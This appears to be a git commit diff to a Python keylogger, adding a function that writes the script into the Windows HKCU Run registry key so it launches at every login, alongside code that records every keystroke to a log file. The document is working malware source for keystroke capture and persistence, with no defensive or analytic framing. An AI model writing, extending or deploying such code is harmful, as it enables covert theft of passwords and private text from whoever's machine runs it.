b6669581e3d56f76462a9763792b7cb1816970aa
MeNeS03-m <przemyslawm03@gmail.com>
2025-07-10 22:08:31 +0200

    Upgraded keylogger with autostart feature

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,26 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
+import os
+import sys
+import winreg as reg
 
 logDir = r"X:/HMMMM/Keylogger"
-logging.basicConfig(filename = (logDir + r"/keyLog.txt"), level= logging.DEBUG, format='%(asctime)s: %(message)s')
+script_path = os.path.realpath(sys.argv[0])
+
+# Auto-start setup
+def add_to_startup(name, path):
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+    reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, path)
+    reg.CloseKey(reg_key)
+
+add_to_startup("MyKeylogger", script_path)
+
+# Keylogging
+logging.basicConfig(filename=(logDir + r"/keyLog.txt"),
+                    level=logging.DEBUG,
+                    format='%(asctime)s: %(message)s')
 
 def on_press(key):
     logging.info(str(key))
